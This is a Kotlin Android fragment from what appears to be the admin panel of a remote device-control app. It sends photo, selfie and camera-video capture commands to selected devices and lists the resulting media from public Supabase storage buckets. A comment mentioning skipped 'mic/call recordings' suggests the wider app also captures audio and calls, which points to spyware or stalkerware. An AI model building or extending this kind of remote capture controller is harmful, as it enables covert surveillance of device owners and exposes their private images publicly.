package com.example.devsync

  import android.graphics.Color
  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
  import kotlinx.coroutines.*

  class CameraFragment : Fragment(R.layout.fragment_camera) {

      private val admin get() = requireActivity() as AdminControlActivity

      private lateinit var rvPhotos: RecyclerView
      private lateinit var rvCameraVideos: RecyclerView
      private lateinit var tvVideoStatus: TextView
      private lateinit var btnTabPhotos: Button
      private lateinit var btnTabVideos: Button

      private val photoList = mutableListOf<ScreenshotItem>()
      private val videoList = mutableListOf<ScreenshotItem>()

      private lateinit var photoAdapter: ScreenshotListAdapter
      private lateinit var videoAdapter: VideoListAdapter

      private var cameraVideoOn = false
      private var showingPhotos = true

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          tvVideoStatus = view.findViewById(R.id.tvCameraVideoStatus)
          btnTabPhotos  = view.findViewById(R.id.btnTabPhotos)
          btnTabVideos  = view.findViewById(R.id.btnTabVideos)

          rvPhotos = view.findViewById(R.id.rvPhotos)
          photoAdapter = ScreenshotListAdapter(photoList)
          rvPhotos.layoutManager = LinearLayoutManager(requireContext())
          rvPhotos.adapter = photoAdapter

          rvCameraVideos = view.findViewById(R.id.rvCameraVideos)
          videoAdapter = VideoListAdapter(videoList)
          rvCameraVideos.layoutManager = LinearLayoutManager(requireContext())
          rvCameraVideos.adapter = videoAdapter

          // Tab switching
          btnTabPhotos.setOnClickListener { switchTab(photos = true) }
          btnTabVideos.setOnClickListener { switchTab(photos = false) }

          // Camera commands
          view.findViewById<Button>(R.id.btnTakePhoto).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_photo").setValue(true) }
          }
          view.findViewById<Button>(R.id.btnTakeSelfie).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_selfie").setValue(true) }
          }
          view.findViewById<Button>(R.id.btnCameraVideo).setOnClickListener {
              cameraVideoOn = !cameraVideoOn
              admin.sendToSelected { d -> d.child("camera_video_flag").setValue(cameraVideoOn) }
              val btn = view.findViewById<Button>(R.id.btnCameraVideo)
              tvVideoStatus.text = if (cameraVideoOn) "● Video: Recording..." else "● Video: Stopped"
              tvVideoStatus.setTextColor(if (cameraVideoOn) Color.parseColor("#FF4444") else Color.parseColor("#8B949E"))
              btn.text = if (cameraVideoOn) "⏹ Stop" else "🎥 Video"
              btn.backgroundTintList = android.content.res.ColorStateList.valueOf(
                  if (cameraVideoOn) Color.parseColor("#DA3633") else Color.parseColor("#1F6FEB"))
          }

          // Pull-to-refresh reloads active tab
          view.findViewById<SwipeRefreshLayout>(R.id.swipeCamera).setOnRefreshListener {
              if (showingPhotos) loadPhotos { view.findViewById<SwipeRefreshLayout>(R.id.swipeCamera).isRefreshing = false }
              else               loadVideos { view.findViewById<SwipeRefreshLayout>(R.id.swipeCamera).isRefreshing = false }
          }

          loadPhotos(null)
          loadVideos(null)
      }

      override fun onResume() {
          super.onResume()
          if (showingPhotos) loadPhotos(null) else loadVideos(null)
      }

      private fun switchTab(photos: Boolean) {
          showingPhotos = photos
          rvPhotos.visibility      = if (photos) View.VISIBLE else View.GONE
          rvCameraVideos.visibility = if (photos) View.GONE   else View.VISIBLE
          btnTabPhotos.setTextColor(if (photos) Color.WHITE else Color.parseColor("#8B949E"))
          btnTabVideos.setTextColor(if (photos) Color.parseColor("#8B949E") else Color.WHITE)
          btnTabPhotos.backgroundTintList = android.content.res.ColorStateList.valueOf(
              if (photos) Color.parseColor("#21262D") else Color.parseColor("#0D1117"))
          btnTabVideos.backgroundTintList = android.content.res.ColorStateList.valueOf(
              if (photos) Color.parseColor("#0D1117") else Color.parseColor("#21262D"))
          if (photos) loadPhotos(null) else loadVideos(null)
      }

      private fun loadPhotos(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("photos")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                      val noExt     = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                      val lastUnder = noExt.lastIndexOf('_')
                      val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                      val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/photos/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  photoList.clear(); photoList.addAll(list)
                  photoAdapter.notifyDataSetChanged()
                  onDone?.invoke()
                  if (list.isEmpty()) admin.showStatus("📸 No photos yet — tap 📷 or 🤳", true)
              }
          }
      }

      private fun loadVideos(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("videos")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      // Only load camera videos (camvid_ prefix), skip mic/call recordings
                      if (!name.startsWith("camvid_") || !name.endsWith(".mp4")) continue
                      val noExt     = name.removeSuffix(".mp4")
                      val parts     = noExt.split("_")
                      val ts        = parts.lastOrNull()?.toLongOrNull() ?: 0L
                      val did       = parts.getOrElse(1) { "" }
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/videos/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  videoList.clear(); videoList.addAll(list)
                  videoAdapter.notifyDataSetChanged()
                  onDone?.invoke()
                  if (list.isEmpty() && !showingPhotos) admin.showStatus("🎥 No camera videos yet", true)
              }
          }
      }
  }
  